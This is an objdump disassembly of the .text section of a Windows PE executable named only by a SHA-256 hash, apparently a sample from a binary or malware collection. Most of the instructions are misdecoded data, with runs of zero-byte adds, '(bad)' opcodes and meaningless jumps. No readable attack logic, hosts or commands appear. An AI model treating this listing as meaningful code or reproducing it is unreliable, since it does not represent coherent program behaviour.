
12583e6a823028d30f25a31bf950a22281e8fe0e751df565bdb82545ba787533.exe:     file format pei-i386


Disassembly of section .text:

11002000 <.text>:
11002000:	jo     0x11001fcc
11002002:	add    BYTE PTR [eax],al
11002004:	add    BYTE PTR [eax],al
11002006:	add    BYTE PTR [eax],al
11002008:	dec    eax
11002009:	add    BYTE PTR [eax],al
1100200b:	add    BYTE PTR [edx],al
1100200d:	add    BYTE PTR ds:0x666800,al
11002013:	add    BYTE PTR [edi+eiz*1],cl
11002016:	add    BYTE PTR [eax],al
11002018:	or     DWORD PTR [eax],eax
1100201a:	add    BYTE PTR [eax],al
1100201c:	sub    BYTE PTR [eax],al
1100201e:	add    BYTE PTR [esi],al
11002020:	je     0x11001faf
11002022:	add    BYTE PTR [eax],al
11002024:	mov    edi,0x5000003c
11002029:	and    BYTE PTR [eax],al
1100202b:	add    BYTE PTR [eax+0x0],al
	...
1100204d:	add    BYTE PTR [eax],al
1100204f:	add    BYTE PTR [eax-0x50],ch
11002052:	mov    edx,0x6bea4aca
11002057:	dec    ecx
11002058:	aam    0x9
1100205a:	js     0x11002032
1100205c:	xor    al,0x17
1100205e:	test   BYTE PTR [ebx+edi*8],dl
11002061:	cmp    bh,bl
11002063:	jne    0x110020ad
11002065:	and    al,0x28
11002067:	xor    ecx,edi
11002069:	dec    eax
1100206a:	sbb    BYTE PTR [ebp-0x31c59ff8],ch
11002070:	(bad)  
11002071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11002072:	loopne 0x11002069
11002074:	clc    
11002075:	das    
11002076:	cmc    
11002077:	lock jnp 0x11002092
1100207a:	call   0x177722f5
1100207f:	imul   edx,eax,0x7f2d40a5
11002085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11002086:	stos   DWORD PTR es:[edi],eax
11002087:	das    
11002088:	xchg   esp,eax
11002089:	dec    edx
1100208a:	or     BYTE PTR [ecx-0x68],dh
1100208d:	ret    0x563f
11002090:	xor    al,0x76
11002092:	jl     0x1100202a
11002094:	stos   DWORD PTR es:[edi],eax
11002095:	mov    edi,0x68246776
1100209a:	outs   dx,DWORD PTR ds:[esi]
1100209b:	ret    
1100209c:	sbb    DWORD PTR [eax+0x2d],edi
1100209f:	repnz mov eax,ds:0x457e221b
110020a5:	mov    eax,0xd8cfa51f
110020aa:	xchg   edi,eax
110020ab:	lock xlat BYTE PTR ds:[ebx]
110020ad:	std    
110020ae:	jo     0x1100204c
110020b0:	imul   edi,ebx,0x6156173d
110020b6:	call   0x9f209aaf
110020bb:	xchg   edx,eax
110020bc:	mov    eax,ds:0xa06326ba
110020c1:	sti    
110020c2:	loope  0x1100208a
110020c4:	inc    ebp
110020c5:	loop   0x1100204a
110020c7:	jmp    0xcdc3:0x67efda89
110020ce:	xor    al,BYTE PTR [edi]
110020d0:	adc    esi,DWORD PTR [eax]
110020d2:	add    al,BYTE PTR [eax]
110020d4:	adc    eax,0x0
110020d9:	add    BYTE PTR [eax],al
110020db:	add    BYTE PTR [edx],al
110020dd:	and    eax,0xb428
110020e2:	or     al,BYTE PTR [ebx]
110020e4:	jge    0x110020e7
110020e6:	add    BYTE PTR [eax],al
110020e8:	add    al,0x2
110020ea:	add    al,0x7d
110020ec:	add    al,BYTE PTR [eax]
110020ee:	add    BYTE PTR [edx+ebp*1],al
110020f1:	add    BYTE PTR [eax],al
110020f3:	add    BYTE PTR [ebx],dl
110020f5:	xor    BYTE PTR [ecx],al
110020f7:	add    BYTE PTR [edi],al
110020f9:	add    BYTE PTR [eax],al
110020fb:	add    BYTE PTR [eax],al
110020fd:	add    BYTE PTR [eax],al
110020ff:	add    BYTE PTR [edx],al
11002101:	jnp    0x11002104
11002103:	add    BYTE PTR [eax],al
11002105:	add    al,0x2a
11002107:	add    BYTE PTR [ebx],dl
11002109:	xor    BYTE PTR [ecx],al
1100210b:	add    BYTE PTR [edi],al
1100210d:	add    BYTE PTR [eax],al
1100210f:	add    BYTE PTR [eax],al
11002111:	add    BYTE PTR [eax],al
11002113:	add    BYTE PTR [edx],al
11002115:	jnp    0x11002119
11002117:	add    BYTE PTR [eax],al
11002119:	add    al,0x2a
1100211b:	add    BYTE PTR [ebx],dl
1100211d:	xor    BYTE PTR [ecx],al
1100211f:	add    BYTE PTR [edx],cl
11002121:	add    BYTE PTR [eax],al
11002123:	add    BYTE PTR [eax],al
11002125:	add    BYTE PTR [eax],al
11002127:	add    BYTE PTR [edx],al
11002129:	sub    BYTE PTR [edx],dl
1100212b:	add    BYTE PTR [eax],al
1100212d:	or     al,BYTE PTR [eax]
1100212f:	add    BYTE PTR [eax],al
11002131:	sub    al,BYTE PTR [eax]
11002133:	add    BYTE PTR [ebx],dl
11002135:	xor    BYTE PTR [eax+eax*1],al
11002138:	cmp    BYTE PTR [eax],bl
1100213a:	add    BYTE PTR [eax],al
1100213c:	add    DWORD PTR [eax],eax
1100213e:	add    BYTE PTR [ecx],dl
11002140:	push   ss
11002141:	adc    ecx,DWORD PTR [ebx]
11002143:	adc    DWORD PTR [ebx],ecx
11002145:	inc    ebp
11002146:	add    DWORD PTR [eax],eax
11002148:	add    BYTE PTR [eax],al
1100214a:	add    BYTE PTR [eax],al
1100214c:	add    BYTE PTR [eax],al
1100214e:	cmp    BYTE PTR [ebx],bh
11002150:	add    eax,DWORD PTR [eax]
11002152:	add    BYTE PTR [ecx],dl
11002154:	or     eax,DWORD PTR [ebp-0x33]
11002157:	add    BYTE PTR [eax],al
11002159:	add    BYTE PTR [ebx+eax*1+0x0],cl
1100215d:	add    dh,cl
1100215f:	sldt   WORD PTR [eax]
11002162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
11002163:	push   cs
11002164:	add    BYTE PTR [eax],al
11002166:	xor    DWORD PTR [eax+eax*1],edx
11002169:	add    BYTE PTR [esi+0x11],al
1100216c:	add    BYTE PTR [eax],al
1100216e:	mov    dh,0x1
11002170:	add    BYTE PTR [eax],al
11002172:	rol    BYTE PTR [edx],1
11002174:	add    BYTE PTR [eax],al
11002176:	mov    ebp,0x8e00000d
1100217b:	or     al,0x0
1100217d:	add    cl,bh
1100217f:	or     DWORD PTR [eax],eax
11002181:	add    BYTE PTR [edi+0x4a000000],cl
11002187:	adc    al,0x0
11002189:	add    BYTE PTR [esi],bl
1100218b:	add    DWORD PTR [eax],eax
1100218d:	add    bh,dh
1100218f:	sldt   WORD PTR [eax]
11002192:	pop    ebx
11002193:	adc    BYTE PTR [eax],al
11002195:	add    dl,cl
11002197:	or     al,0x0
11002199:	add    dh,cl
1100219b:	adc    al,0x0
1100219d:	add    BYTE PTR [ebx-0x68fffffc],al
110021a3:	or     DWORD PTR [eax],eax
110021a5:	add    dl,bh
110021a7:	add    DWORD PTR [eax],eax
110021a9:	add    BYTE PTR [edx+0x7],bl
110021ac:	add    BYTE PTR [eax],al
110021ae:	clc    
110021af:	add    al,0x0
110021b1:	add    dh,bl
110021b3:	push   es
110021b4:	add    BYTE PTR [eax],al
110021b6:	pop    ebx
110021b7:	adc    al,BYTE PTR [eax]
110021b9:	add    ah,bl
110021bb:	add    eax,0x41c0000
110021c0:	add    BYTE PTR [eax],al
110021c2:	data16 adc al,0x0
110021c5:	add    BYTE PTR [ebp+0x20000002],bh
110021cb:	sldt   WORD PTR [eax]
110021ce:	mov    WORD PTR ds:0x10f80000,es
110021d4:	add    BYTE PTR [eax],al
110021d6:	(bad)  
110021d7:	add    DWORD PTR [eax],eax
110021d9:	add    dl,al
110021db:	add    eax,DWORD PTR [eax]
110021dd:	add    BYTE PTR [edx+0x12],cl
110021e0:	add    BYTE PTR [eax],al
110021e2:	imul   eax,DWORD PTR [edx],0x0
110021e5:	add    BYTE PTR [ebx],cl
110021e7:	pop    es
110021e8:	add    BYTE PTR [eax],al
110021ea:	sbb    BYTE PTR [eax],dl
110021ec:	add    BYTE PTR [eax],al
110021ee:	add    BYTE PTR [ecx],0x0
110021f1:	add    BYTE PTR [esi+0xb],ch
110021f4:	add    BYTE PTR [eax],al
110021f6:	fwait
110021f7:	push   es
110021f8:	add    BYTE PTR [eax],al
110021fa:	jae    0x1100220e
110021fc:	add    BYTE PTR [eax],al
110021fe:	mov    edx,0x39000011
11002203:	pop    es
11002204:	add    BYTE PTR [eax],al
11002206:	mov    DWORD PTR ds:0x6750000,ecx
1100220c:	add    BYTE PTR [eax],al
1100220e:	jns    0x11002218
11002210:	add    BYTE PTR [eax],al
11002212:	in     eax,0xc
11002214:	add    BYTE PTR [eax],al
11002216:	lahf   
11002217:	adc    eax,DWORD PTR [eax]
11002219:	add    bl,dl
1100221b:	adc    eax,DWORD PTR [eax]
1100221d:	add    BYTE PTR [esi+0x7200000a],bh
11002223:	push   cs
11002224:	add    BYTE PTR [eax],al
11002226:	int3   
11002227:	adc    al,BYTE PTR [eax]
11002229:	add    bh,ah
1100222b:	add    al,0x0
1100222d:	add    cl,bh
1100222f:	adc    al,BYTE PTR [eax]
11002231:	add    ah,ch
11002233:	adc    DWORD PTR [eax],eax
11002235:	add    BYTE PTR [edx-0x54fffff3],ch
1100223b:	or     al,BYTE PTR [eax]
1100223d:	add    BYTE PTR [eax*1+0x4720000],ch
11002244:	add    BYTE PTR [eax],al
11002246:	or     al,0x13
11002248:	add    BYTE PTR [eax],al
1100224a:	fisttp WORD PTR [edi]
1100224c:	add    BYTE PTR [eax],al
1100224e:	xor    cl,BYTE PTR [eax+eax*1]
11002251:	add    BYTE PTR [ebp+0x3],bh
11002254:	add    BYTE PTR [eax],al
11002256:	ds add al,0x0
11002259:	add    ah,dh
1100225b:	add    eax,0xbf0000
11002260:	add    BYTE PTR [eax],al
11002262:	fs push es
11002264:	add    BYTE PTR [eax],al
11002266:	pop    ds
11002267:	adc    eax,DWORD PTR [eax]
11002269:	add    BYTE PTR [ecx+0x4a000011],bl
1100226f:	or     eax,0x7260000
11002274:	add    BYTE PTR [eax],al
11002276:	dec    edx
11002277:	or     al,0x0
11002279:	add    BYTE PTR [eax+0x2],bl
1100227c:	add    BYTE PTR [eax],al
1100227e:	aaa    
1100227f:	adc    eax,DWORD PTR [eax]
11002281:	add    BYTE PTR [ebx+0x0],al
11002284:	add    BYTE PTR [eax],al
11002286:	jns    0x11002294
11002288:	add    BYTE PTR [eax],al
1100228a:	mov    bh,0x6
1100228c:	add    BYTE PTR [eax],al
1100228e:	fst    DWORD PTR [ecx]
11002290:	add    BYTE PTR [eax],al
11002292:	outs   dx,BYTE PTR ds:[esi]
11002293:	adc    BYTE PTR [eax],al
11002295:	add    BYTE PTR [esi],bl
11002297:	or     eax,DWORD PTR [eax]
11002299:	add    BYTE PTR [ecx+eax*1+0x0],ch
1100229d:	add    BYTE PTR [edi+0x5],al
110022a0:	add    BYTE PTR [eax],al
110022a2:	loopne 0x110022ac
110022a4:	add    BYTE PTR [eax],al
110022a6:	sub    cl,BYTE PTR [eax]
110022a8:	add    BYTE PTR [eax],al
110022aa:	rcl    BYTE PTR [ebx],0x0
110022ad:	add    BYTE PTR [edi],ch
110022af:	adc    al,BYTE PTR [eax]
110022b1:	add    BYTE PTR [edi],al
110022b3:	adc    al,BYTE PTR [eax]
110022b5:	add    BYTE PTR [ebx],ch
110022b7:	adc    BYTE PTR [eax],al
110022b9:	add    BYTE PTR ds:0x3d000006,dl
110022bf:	or     DWORD PTR [eax],eax
110022c1:	add    BYTE PTR [esi+0xa],cl
110022c4:	add    BYTE PTR [eax],al
110022c6:	cmp    cl,BYTE PTR ds:0x2830000
110022cc:	add    BYTE PTR [eax],al
110022ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
110022cf:	pop    es
110022d0:	add    BYTE PTR [eax],al
110022d2:	push   eax
110022d3:	or     DWORD PTR [eax],eax
110022d5:	add    BYTE PTR [esi+0x8],ah
110022d8:	add    BYTE PTR [eax],al
110022da:	jns    0x110022e6
110022dc:	add    BYTE PTR [eax],al
110022de:	sbb    DWORD PTR ds:0x7c20000,ecx
110022e4:	add    BYTE PTR [eax],al
110022e6:	jns    0x110022fc
110022e8:	add    BYTE PTR [eax],al
110022ea:	mov    bh,0xe
110022ec:	add    BYTE PTR [eax],al
110022ee:	add    BYTE PTR fs:[eax],al
110022f1:	add    BYTE PTR [ebx-0x75fffff1],bh
110022f7:	or     BYTE PTR [eax],al
110022f9:	add    BYTE PTR [edx+0xf],bl
110022fc:	add    BYTE PTR [eax],al
110022fe:	mov    edx,0xb100000c
11002303:	add    eax,DWORD PTR [eax]
11002305:	add    BYTE PTR ds:0x9500000b,cl
1100230b:	sldt   WORD PTR [eax]
1100230e:	mov    ebx,0x57000012
11002313:	push   cs
11002314:	add    BYTE PTR [eax],al
11002316:	push   0x2000005
1100231b:	or     BYTE PTR [eax],al
1100231d:	add    BYTE PTR [ecx-0x79fffff0],al
11002323:	adc    DWORD PTR [eax],eax
11002325:	add    BYTE PTR [ebx+0x4900000e],dl
1100232b:	push   es
1100232c:	add    BYTE PTR [eax],al
1100232e:	sahf   
1100232f:	add    eax,0x2f10000
11002334:	add    BYTE PTR [eax],al
11002336:	in     eax,0x0
11002338:	add    BYTE PTR [eax],al
1100233a:	nop
1100233b:	pop    es
1100233c:	add    BYTE PTR [eax],al
1100233e:	cmp    cl,BYTE PTR [ebx]
11002340:	add    BYTE PTR [eax],al
11002342:	jle    0x1100234b
11002344:	add    BYTE PTR [eax],al
11002346:	pop    ecx
11002347:	add    DWORD PTR [eax],eax
11002349:	add    BYTE PTR [ebx],dl
1100234b:	or     BYTE PTR [eax],al
1100234d:	add    BYTE PTR ds:0xe8000003,dl
11002353:	add    eax,DWORD PTR [eax]
11002355:	add    dh,cl
11002357:	or     eax,0x8bf0000
1100235c:	add    BYTE PTR [eax],al
1100235e:	sbb    ecx,DWORD PTR [eax+eax*1]
11002361:	add    dh,bh
11002363:	or     eax,0xf60000
11002368:	add    BYTE PTR [eax],al
1100236a:	out    0xd,al
1100236c:	add    BYTE PTR [eax],al
1100236e:	lahf   
1100236f:	or     eax,DWORD PTR [eax]
11002371:	add    bl,cl
11002373:	push   es
11002374:	add    BYTE PTR [eax],al
11002376:	mov    eax,0x9c000009
1100237b:	add    al,BYTE PTR [eax]
1100237d:	add    bl,cl
1100237f:	add    eax,0xd640000
11002384:	add    BYTE PTR [eax],al
11002386:	ins    DWORD PTR es:[edi],dx
11002387:	pop    es
11002388:	add    BYTE PTR [eax],al
1100238a:	xlat   BYTE PTR ds:[ebx]
1100238b:	add    eax,DWORD PTR [eax]
1100238d:	add    bh,cl
1100238f:	add    al,0x0
11002391:	add    cl,dh
11002393:	push   es
11002394:	add    BYTE PTR [eax],al
11002396:	pop    edi
11002397:	add    al,0x0
11002399:	add    cl,dl
1100239b:	push   cs
1100239c:	add    BYTE PTR [eax],al
1100239e:	xor    DWORD PTR [edi],ecx
110023a0:	add    BYTE PTR [eax],al
110023a2:	mov    eax,ds:0x9b000012
110023a7:	adc    BYTE PTR [eax],al
110023a9:	add    BYTE PTR [esi],cl
110023ab:	or     DWORD PTR [eax],eax
110023ad:	add    BYTE PTR [edi+ecx*1+0x0],dh
110023b1:	add    bl,dh
110023b3:	or     al,BYTE PTR [eax]
110023b5:	add    ah,ah
110023b7:	adc    al,BYTE PTR [eax]
110023b9:	add    BYTE PTR [ebx+eax*1],al
110023bc:	add    BYTE PTR [eax],al
110023be:	push   0x3
110023c0:	add    BYTE PTR [eax],al
110023c2:	sub    al,0x11
110023c4:	add    BYTE PTR [eax],al
110023c6:	sub    eax,0xad00000a
110023cb:	add    al,0x0
110023cd:	add    BYTE PTR [ebx+0xb],bl
110023d0:	add    BYTE PTR [eax],al
110023d2:	adc    ax,WORD PTR [eax]
110023d5:	add    BYTE PTR [edx],al
110023d7:	add    al,0x0
110023d9:	add    bl,dl
110023db:	or     eax,DWORD PTR [eax]
110023dd:	add    BYTE PTR [esi],bh
110023df:	adc    BYTE PTR [eax],al
110023e1:	add    BYTE PTR [edx+0x63000014],bl
110023e7:	or     DWORD PTR [eax],eax
110023e9:	add    BYTE PTR [ecx-0x27ffffee],dl
110023ef:	or     al,BYTE PTR [eax]
110023f1:	add    BYTE PTR [eax-0x2dfffff1],ch
110023f7:	add    BYTE PTR [eax],al
110023f9:	add    BYTE PTR [ebx+0x19000005],dh
110023ff:	adc    DWORD PTR [eax],eax
11002401:	add    BYTE PTR [edi+0x11],dl
11002404:	add    BYTE PTR [eax],al
11002406:	sahf   
11002407:	add    eax,DWORD PTR [eax]
11002409:	add    ch,ah
1100240b:	adc    BYTE PTR [eax],al
1100240d:	add    BYTE PTR [eax],bh
1100240f:	add    DWORD PTR [eax],eax
11002411:	add    BYTE PTR [ecx+ecx*1+0x1e90000],al
11002418:	add    BYTE PTR [eax],al
1100241a:	adc    DWORD PTR [esi],ecx
1100241c:	add    BYTE PTR [eax],al
1100241e:	xor    BYTE PTR [eax],al
11002420:	add    BYTE PTR [eax],al
11002422:	cmp    eax,0x2300000e
11002427:	push   cs
11002428:	add    BYTE PTR [eax],al
1100242a:	retf   
1100242b:	or     DWORD PTR [eax],eax
1100242d:	add    BYTE PTR [ecx],bl
1100242f:	add    eax,0xb8c0000
11002434:	add    BYTE PTR [eax],al
11002436:	cmp    BYTE PTR [eax],cl
11002438:	add    BYTE PTR [eax],al
1100243a:	repz or BYTE PTR [eax],al
1100243d:	add    BYTE PTR [edx+ecx*1],dl
11002440:	add    BYTE PTR [eax],al
11002442:	mov    WORD PTR [ebx],ss
11002444:	add    BYTE PTR [eax],al
11002446:	sub    BYTE PTR [esi],al
11002448:	add    BYTE PTR [eax],al
1100244a:	loope  0x11002460
1100244c:	add    BYTE PTR [eax],al
1100244e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
1100244f:	or     BYTE PTR [eax],al
11002451:	add    BYTE PTR [ebp+0x4a000014],ch
11002457:	or     BYTE PTR [eax],al
11002459:	add    BYTE PTR [ecx+eax*1+0xbc00000],bl
11002460:	add    BYTE PTR [eax],al
11002462:	or     ecx,DWORD PTR [edi]
11002464:	add    BYTE PTR [eax],al
11002466:	in     al,0x13
11002468:	add    BYTE PTR [eax],al
1100246a:	ja     0x1100246c
1100246c:	add    BYTE PTR [eax],al
1100246e:	push   ebx
1100246f:	adc    eax,DWORD PTR [eax]
11002471:	add    BYTE PTR [ebx+0x5],bh
11002474:	add    BYTE PTR [eax],al
11002476:	out    0x9,al
11002478:	add    BYTE PTR [eax],al
1100247a:	rol    DWORD PTR [edi],cl
1100247c:	add    BYTE PTR [eax],al
1100247e:	popa   
1100247f:	or     al,BYTE PTR [eax]
11002481:	add    BYTE PTR [esi],al
11002483:	or     eax,0x13790000
11002488:	add    BYTE PTR [eax],al
1100248a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
1100248b:	adc    DWORD PTR [eax],eax
1100248d:	add    BYTE PTR [eax],al
1100248f:	jae    0x110024a4
11002491:	add    BYTE PTR [eax],al
11002493:	or     cl,BYTE PTR [edx]
11002495:	push   ss
11002496:	or     eax,DWORD PTR [ebx]
11002498:	outs   dx,DWORD PTR ds:[esi]
11002499:	adc    al,0x0
1100249b:	add    BYTE PTR [edx],cl
1100249d:	je     0x110024b5
1100249f:	add    BYTE PTR [eax],al
110024a1:	add    DWORD PTR [eax+0x4000003],eax
110024a7:	add    cl,BYTE PTR [esi+0x1fe1669]
110024ad:	push   ss
110024ae:	inc    BYTE PTR [ecx]
110024b0:	adc    eax,DWORD PTR [esi]
110024b2:	and    BYTE PTR [ecx+0x13000000],dh
110024b8:	or     edi,DWORD PTR [eax]
110024ba:	xchg   ebp,eax
110024bb:	cld    
110024bc:	(bad)  
110024bd:	call   DWORD PTR [ecx]
110024bf:	push   es
110024c0:	cmp    bh,BYTE PTR [ecx]
110024c2:	add    al,BYTE PTR [eax]
110024c4:	add    BYTE PTR [eax],ah
110024c6:	dec    edx
110024c7:	add    BYTE PTR [eax],al
110024c9:	add    BYTE PTR [ebx],dl
110024cb:	or     edi,DWORD PTR [eax]
110024cd:	cmp    ah,0xff
110024d0:	(bad)  
110024d1:	cmp    ah,al
110024d3:	adc    DWORD PTR [eax],eax
110024d5:	add    BYTE PTR [ecx],cl
110024d7:	jb     0x110024da
110024d9:	add    BYTE PTR [eax],al
110024db:	jo     0x1100254c
110024dd:	adc    eax,0x160a0000
110024e2:	inc    BYTE PTR [ecx]
110024e4:	adc    eax,DWORD PTR [esi]
110024e6:	and    BYTE PTR [ebp+0x0],ah
110024e9:	add    BYTE PTR [eax],al
110024eb:	adc    ecx,DWORD PTR [ebx]
110024ed:	cmp    BYTE PTR [ecx-0x4],ah
110024f0:	(bad)  
110024f1:	call   DWORD PTR [ecx]
110024f3:	push   es
110024f4:	cmp    bl,BYTE PTR [esi+0x10]
110024f7:	add    BYTE PTR [eax],al
110024f9:	and    ah,al
110024fb:	add    BYTE PTR [eax],al
110024fd:	add    BYTE PTR [ebx],dl
110024ff:	or     edi,DWORD PTR [eax]
11002501:	dec    esi
11002502:	cld    
11002503:	(bad)  
11002504:	(bad)  
11002505:	cmp    BYTE PTR [ecx+0xa],ah
11002508:	add    BYTE PTR [eax],al
1100250a:	add    BYTE PTR [ecx],dl
1100250c:	or     BYTE PTR [edi],dl
1100250e:	pop    eax
1100250f:	adc    ecx,DWORD PTR [eax]
11002511:	and    BYTE PTR [edx],cl
11002513:	add    BYTE PTR [eax],al
11002515:	add    BYTE PTR [ebx],dl
11002517:	or     edi,DWORD PTR [eax]
11002519:	ss cld 
1100251b:	(bad)  
1100251c:	(bad)  
1100251d:	cmp    BYTE PTR [esi+eax*1+0x0],bh
11002521:	add    BYTE PTR [ebx+eax*1],al
11002524:	outs   dx,DWORD PTR ds:[esi]
11002525:	push   ss
11002526:	add    BYTE PTR [eax],al
11002528:	or     ch,BYTE PTR [eax]
1100252a:	sbb    al,BYTE PTR [eax]
1100252c:	add    BYTE PTR [esi],al
1100252e:	add    BYTE PTR [esi+0x3],bh
11002531:	add    BYTE PTR [eax],al
11002533:	add    al,0x4
11002535:	outs   dx,DWORD PTR ds:[esi]
11002536:	pop    ss
11002537:	add    BYTE PTR [eax],al
11002539:	or     al,BYTE PTR [eax]
1100253b:	pop    es
1100253c:	push   ss
1100253d:	inc    BYTE PTR [ecx]
1100253f:	adc    eax,DWORD PTR [esi]
11002541:	and    BYTE PTR [ecx+0x0],al
11002544:	add    BYTE PTR [eax],al
11002546:	adc    ecx,DWORD PTR [ebx]
11002548:	cmp    BYTE PTR [esi],al
1100254a:	cld    
1100254b:	(bad)  
1100254c:	call   DWORD PTR [ecx]
1100254e:	push   es
1100254f:	cmp    bh,BYTE PTR [ebx+ecx*1]
11002552:	add    BYTE PTR [eax],al
11002554:	and    BYTE PTR [edi+0x13000000],ah
1100255a:	or     edi,DWORD PTR [eax]
1100255c:	repz sti 
1100255e:	(bad)  
1100255f:	(bad)  
11002560:	cmp    BYTE PTR [edx],dl
11002562:	adc    eax,DWORD PTR [eax]
11002564:	add    BYTE PTR [eax],al
11002566:	add    BYTE PTR [eax],ah
11002568:	ja     0x1100256a
1100256a:	add    BYTE PTR [eax],al
1100256c:	adc    ecx,DWORD PTR [ebx]
1100256e:	cmp    al,ah
11002570:	sti    
11002571:	(bad)  
11002572:	(bad)  
11002573:	cmp    BYTE PTR [edi+0x4],al
11002576:	add    BYTE PTR [eax],al
11002578:	and    BYTE PTR [ebx+0x13000000],al
1100257e:	or     edi,DWORD PTR [eax]
11002580:	iret   
11002581:	sti    
11002582:	(bad)  
11002583:	dec    DWORD PTR [eax]
11002585:	pop    ss
11002586:	outs   dx,DWORD PTR ds:[esi]
11002587:	sbb    BYTE PTR [eax],al
11002589:	add    BYTE PTR [edx],cl
1100258b:	pop    ds
1100258c:	inc    BYTE PTR [bx+di]
1100258f:	push   ss
11002590:	inc    BYTE PTR [ecx]
11002592:	cmp    BYTE PTR [esi+ecx*1+0x8000000],ah
11002599:	sub    BYTE PTR [esi],dl
1100259b:	add    BYTE PTR [eax],al
1100259d:	push   es
1100259e:	add    BYTE PTR [eax],al
110025a0:	and    BYTE PTR [eax+eax*1],cl
110025a3:	add    BYTE PTR [eax],al
110025a5:	adc    ecx,DWORD PTR [ebx]
110025a7:	cmp    BYTE PTR [edi+0x38fffffb],ah
110025ad:	push   cs
110025ae:	add    al,0x0
110025b0:	add    BYTE PTR [eax],al
110025b2:	or     BYTE PTR [eax],ch
110025b4:	push   ss
110025b5:	add    BYTE PTR [eax],al
110025b7:	push   es
110025b8:	add    BYTE PTR [eax],al
110025ba:	and    BYTE PTR [ebp+0x13000000],ch
110025c0:	or     edi,DWORD PTR [eax]
110025c2:	(bad)  
110025c3:	sti    
110025c4:	(bad)  
110025c5:	(bad)  
110025c6:	cmp    ah,dh
110025c8:	add    eax,DWORD PTR [eax]
110025ca:	add    BYTE PTR [ecx],cl
110025cc:	jb     0x110025d5
110025ce:	add    BYTE PTR [eax],al
110025d0:	jo     0x11002641
110025d2:	adc    eax,0x160a0000
110025d7:	inc    BYTE PTR [ecx]
110025d9:	adc    eax,DWORD PTR [esi]
110025db:	and    BYTE PTR [ebx+0x0],bh
110025de:	add    BYTE PTR [eax],al
110025e0:	adc    ecx,DWORD PTR [ebx]
110025e2:	cmp    BYTE PTR [ebx+edi*8-0x1],ch
110025e6:	call   DWORD PTR [ecx]
110025e8:	push   es
110025e9:	cmp    cl,BYTE PTR [edx]
110025eb:	adc    BYTE PTR [eax],al
110025ed:	add    BYTE PTR [eax],ah
110025ef:	push   eax
110025f0:	add    BYTE PTR [eax],al
110025f2:	add    BYTE PTR [ebx],dl
110025f4:	or     edi,DWORD PTR [eax]
110025f6:	pop    ecx
110025f7:	sti    
110025f8:	(bad)  
110025f9:	jmp    FWORD PTR [ebx]
110025fb:	xor    edx,DWORD PTR [ecx]
110025fd:	add    al,0x28
110025ff:	adc    DWORD PTR [eax],eax
11002601:	add    BYTE PTR [esi],al
11002603:	add    BYTE PTR [eax],ah
11002605:	and    eax,0x13000000
1100260a:	or     edi,DWORD PTR [eax]
1100260c:	inc    ebx
1100260d:	sti    
1100260e:	(bad)  
1100260f:	(bad)  
11002610:	cmp    BYTE PTR [esi],ah
11002612:	adc    BYTE PTR [eax],al
11002614:	add    BYTE PTR [eax],al
11002616:	or     BYTE PTR [eax],ch
11002618:	push   ss
11002619:	add    BYTE PTR [eax],al
1100261b:	push   es
1100261c:	add    BYTE PTR [eax],al
1100261e:	and    al,al
11002620:	add    BYTE PTR [eax],al
11002622:	add    BYTE PTR [ebx],dl
11002624:	or     edi,DWORD PTR [eax]
11002626:	sub    ebx,edi
11002628:	(bad)  
11002629:	(bad)  
1100262a:	cmp    BYTE PTR [eax+0x3],dl
11002630:	or     BYTE PTR [eax],ch
11002632:	push   ss
11002633:	add    BYTE PTR [eax],al
11002635:	push   es
11002636:	add    BYTE PTR [eax],al
11002638:	and    BYTE PTR ds:0x13000000,al
1100263e:	or     edi,DWORD PTR [eax]
11002640:	psubq  mm7,mm7
11002643:	(bad)  
11002644:	cmp    BYTE PTR [esi+0x3],dh
11002647:	add    BYTE PTR [eax],al
11002649:	add    BYTE PTR [eax],cl
1100264b:	outs   dx,DWORD PTR ds:[esi]
1100264c:	sbb    DWORD PTR [eax],eax
1100264e:	add    BYTE PTR [edx],cl
11002650:	sbb    dh,bh
11002652:	add    DWORD PTR [esi],edx
11002654:	inc    BYTE PTR [ecx]
11002656:	adc    eax,DWORD PTR [esi]
11002658:	and    BYTE PTR [edi],bl
1100265a:	add    BYTE PTR [eax],al
1100265c:	add    BYTE PTR [ebx],dl
1100265e:	or     edi,DWORD PTR [eax]
11002660:	out    dx,eax
11002661:	cli    
11002662:	(bad)  
11002663:	call   DWORD PTR [ecx]
11002665:	push   es
11002666:	cmp    ah,dl
11002668:	sldt   WORD PTR [eax]
1100266b:	and    BYTE PTR [edi+0x13000000],ch
11002671:	or     edi,DWORD PTR [eax]
11002673:	fdiv   st(2),st
11002675:	(bad)  
11002676:	(bad)  
11002677:	cmp    BYTE PTR [edx+0x20000010],cl
1100267d:	adc    eax,DWORD PTR [eax]
1100267f:	add    BYTE PTR [eax],al
11002681:	adc    ecx,DWORD PTR [ebx]
11002683:	cmp    bl,cl
11002685:	cli    
11002686:	(bad)  
11002687:	dec    DWORD PTR [eax]
11002689:	jb     0x1100269c
1100268b:	add    BYTE PTR [eax],al
1100268d:	jo     0x110026fe
1100268f:	sbb    al,BYTE PTR [eax]
11002691:	add    BYTE PTR [edx],cl
11002693:	cmp    BYTE PTR [esi+0xe],dl
11002696:	add    BYTE PTR [eax],al
11002698:	sub    BYTE PTR [ebx],bl
1100269a:	add    BYTE PTR [eax],al
1100269c:	or     dh,BYTE PTR [edx+0x15]
1100269f:	add    BYTE PTR [eax],al
110026a1:	jo     0x11002712
110026a3:	sbb    al,0x0
110026a5:	add    BYTE PTR [edx],cl
110026a7:	sbb    BYTE PTR [ebp+0x1000014],cl
110026ad:	adc    ecx,DWORD PTR [ecx]
110026af:	adc    DWORD PTR [ecx],ecx
110026b1:	push   ss
110026b2:	jle    0x110026b8
110026b4:	add    BYTE PTR [eax],al
110026b6:	add    al,0xa2
110026b8:	adc    DWORD PTR [ecx],ecx
110026ba:	pop    ss
110026bb:	or     BYTE PTR [edx+0x1d280911],ah
110026c1:	add    BYTE PTR [eax],al
110026c3:	or     dh,BYTE PTR [ebx+0x1e]
110026c6:	add    BYTE PTR [eax],al
110026c8:	or     bh,BYTE PTR [edx+0x9]
110026cb:	jb     0x1100271c
110026cd:	add    BYTE PTR [eax],al
110026cf:	jo     0x11002740
110026d1:	adc    eax,0x160a0000
110026d6:	inc    BYTE PTR [ecx]
110026d8:	adc    eax,DWORD PTR [esi]
110026da:	and    BYTE PTR [eax+0x0],cl
110026dd:	add    BYTE PTR [eax],al
